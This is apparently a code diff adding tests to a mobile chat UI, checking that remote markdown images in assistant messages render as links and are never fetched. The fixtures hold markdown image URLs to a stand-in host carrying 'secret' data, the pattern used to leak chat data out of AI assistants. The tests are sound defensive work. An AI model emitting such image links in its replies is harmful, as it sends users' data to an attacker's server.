@@ -89,6 +89,45 @@ describe("MobileChatComponents & MobileChatMessage", () => {
     expect(screen.queryByTestId("message-copy-button")).not.toBeInTheDocument();
   });
 
+  it("never fetches a remote markdown image: it becomes a tap-to-open link with alt text and host", () => {
+    const { container } = render(
+      <MobileChatMessage
+        id="msg-img"
+        role="assistant"
+        content={"Done ![the chart](https://evil.example/leak?d=secret) and ![x](data:image/png;base64,AAAA)"}
+      />
+    );
+    const sources = Array.from(container.querySelectorAll("img")).map((img) => img.getAttribute("src"));
+    expect(sources).toEqual(["data:image/png;base64,AAAA"]);
+    const link = screen.getByTestId("markdown-remote-image");
+    expect(link).toHaveTextContent("the chart (evil.example)");
+    expect(link).toHaveAttribute("href", "https://evil.example/leak?d=secret");
+  });
+
+  it("never fetches a remote markdown image inside a rich reference text part", () => {
+    const { container } = render(
+      <MobileChatMessage
+        id="msg-ref-img"
+        role="assistant"
+        content=""
+        referenceParts={[{ kind: "text", text: "![](https://evil.example/?d=secret)" }]}
+      />
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(screen.getByTestId("markdown-remote-image")).toHaveTextContent("Image (evil.example)");
+  });
+
+  it("keeps rendered prose mounted when only unrelated props change", () => {
+    const { rerender } = render(
+      <MobileChatMessage id="m" role="assistant" content="stable prose" timestamp={1} />
+    );
+    const paragraph = screen.getByText("stable prose");
+    rerender(<MobileChatMessage id="m" role="assistant" content="stable prose" timestamp={2} />);
+    expect(screen.getByText("stable prose")).toBe(paragraph);
+    rerender(<MobileChatMessage id="m" role="assistant" content="stable prose" timestamp={2} durationLabel="1m" />);
+    expect(screen.getByText("stable prose")).toBe(paragraph);
+  });
+
   it("renders ApprovalActionCard", () => {
     const { container } = render(
       <ApprovalActionCard
